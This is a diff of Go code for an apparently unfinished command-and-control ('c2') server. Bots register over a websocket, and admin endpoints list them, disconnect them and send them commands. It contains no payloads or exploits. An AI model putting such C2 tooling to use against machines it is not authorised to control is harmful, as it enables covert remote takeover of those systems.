@@ -71,9 +71,7 @@ func (c *c2) getBot(id int) *Bot {
 }
 
 func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
-	b := Bot{
-		Active: false,
-	}
+	b := Bot{}
 
 	var con *websocket.Conn
 	var err error
@@ -81,11 +79,10 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		log.Println(err)
 		return
 	}
-	go heartBeat(con, &b)
-	defer con.Close(websocket.StatusNormalClosure, "")
+
 	ctx := context.Background()
 	if err := wsjson.Read(ctx, con, &b); err != nil {
-		log.Println(err)
+		log.Println("Error reading the initial data of the bot : ", err)
 		return
 	}
 	b.mu.Lock()
@@ -96,54 +93,43 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	b.mu.Unlock()
 
 	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
-	for {
-		// var botmsg string
-		if err := wsjson.Read(ctx, con, &b.BotMessage); err != nil {
-			log.Println(err)
-			return
-		}
 
-		switch b.BotMessage.Type {
-		case "heartbeat":
-			b.updateLastseen()
-		case "whoami":
-			fmt.Println("CMD: ", b.BotMessage.Type, " Result: ", b.BotMessage.Message)
-			b.updateLastseen()
-
-		}
-
-	}
+	c.listentoBot(&b)
 
 }
 
-func heartBeat(con *websocket.Conn, bot *Bot) {
-
-	timer := time.Tick(10 * time.Second)
-	inactiveSince := time.Now()
-
-	for range timer {
-		bot.mu.Lock()
-		lastseen := bot.LastSeen
-		active := bot.Active
-		bot.mu.Unlock()
-		if !active {
-			if time.Since(inactiveSince) > 15*time.Second {
-				fmt.Println("Closing now...")
-				con.CloseNow()
-				return
-			}
-			continue
-		}
-
-		if time.Since(lastseen) > 1*time.Minute {
-			fmt.Println("Closing now..")
-			con.CloseNow()
-			return
-		}
-
-	}
+func (c *c2) listentoBot(bot *Bot) {
 
 }
+
+// func heartBeat(con *websocket.Conn, bot *Bot) {
+
+// 	timer := time.Tick(10 * time.Second)
+// 	inactiveSince := time.Now()
+
+// 	for range timer {
+// 		bot.mu.Lock()
+// 		lastseen := bot.LastSeen
+// 		active := bot.Active
+// 		bot.mu.Unlock()
+// 		if !active {
+// 			if time.Since(inactiveSince) > 15*time.Second {
+// 				fmt.Println("Closing now...")
+// 				con.CloseNow()
+// 				return
+// 			}
+// 			continue
+// 		}
+
+// 		if time.Since(lastseen) > 1*time.Minute {
+// 			fmt.Println("Closing now..")
+// 			con.CloseNow()
+// 			return
+// 		}
+
+// 	}
+
+// }
 
 func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 	cmd := Command{}
@@ -175,8 +161,9 @@ func main() {
 	wg.Add(2)
 	c2 := Newc2()
 	adminMux := http.NewServeMux()
-	adminMux.HandleFunc("/executeCommand", c2.SendCommand)
+	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
 	adminMux.HandleFunc("/listBots", c2.ListBots)
+	adminMux.HandleFunc("/disconnect/{botid}/", c2.DisconnectBot)
 
 	botMux := http.NewServeMux()
 	botMux.HandleFunc("/connect", c2.connectBot)
